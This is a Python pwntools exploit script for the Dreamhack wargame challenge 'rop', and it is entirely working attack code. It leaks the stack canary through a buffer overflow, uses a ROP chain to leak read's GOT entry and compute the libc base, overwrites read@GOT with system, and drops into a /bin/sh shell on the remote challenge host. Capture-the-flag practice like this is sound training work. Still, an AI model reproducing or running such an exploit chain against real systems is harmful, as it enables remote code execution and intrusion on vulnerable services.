from pwn import *
from pathlib import Path


SCRIPT_DIR = Path(__file__).resolve().parent
DEFAULT_CHALL_DIR = Path("/home/khgkhg05/dreamhack/wargame/pwnable/rop")


def challenge_file(name, arg_name):
    requested = getattr(args, arg_name) or name
    path = Path(requested)
    if path.exists():
        return str(path)

    for candidate in (SCRIPT_DIR / name, DEFAULT_CHALL_DIR / name):
        if candidate.exists():
            return str(candidate)

    return str(path)


def start():
    host = args.HOST or "host3.dreamhack.games"
    port = int(args.PORT or 11506)

    if args.LOCAL:
        return process(BIN)

    return remote(host, port)


def main():
    global BIN, LIBC

    BIN = challenge_file("rop", "BIN")
    LIBC = challenge_file("libc.so.6", "LIBC")
    context.binary = BIN

    e = ELF(BIN)
    libc = ELF(LIBC)
    p = start()

    leak_payload = b"A" * 0x30 + b"B" * 0x08 + b"C"
    p.sendafter(b"Buf: ", leak_payload)
    p.recvuntil(leak_payload)
    canary = b"\x00" + p.recvn(7)

    read_plt = e.plt["read"]
    read_got = e.got["read"]
    write_plt = e.plt["write"]

    pop_rdi = 0x400853
    pop_rsi_r15 = 0x400851
    ret = 0x400854

    payload = b"A" * 0x38
    payload += canary
    payload += b"B" * 0x08

    payload += p64(pop_rdi) + p64(1)
    payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
    payload += p64(write_plt)

    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
    payload += p64(read_plt)

    payload += p64(pop_rdi) + p64(read_got + 0x08)
    payload += p64(ret)
    payload += p64(read_plt)

    p.sendafter(b"Buf: ", payload)

    read_leak = u64(p.recvn(6) + b"\x00" * 2)
    p.recvn(0x100 - 6, timeout=1)
    libc_base = read_leak - libc.symbols["read"]
    system = libc_base + libc.symbols["system"]

    log.info("canary    = %#x", u64(canary))
    log.info("read leak = %#x", read_leak)
    log.info("libc base = %#x", libc_base)
    log.info("system    = %#x", system)

    p.send(p64(system) + b"/bin/sh\x00")

    cmd = args.CMD
    if cmd:
        p.sendline(cmd.encode())
        print(p.recvrepeat(2).decode(errors="replace"))
    else:
        p.interactive()


if __name__ == "__main__":
    main()
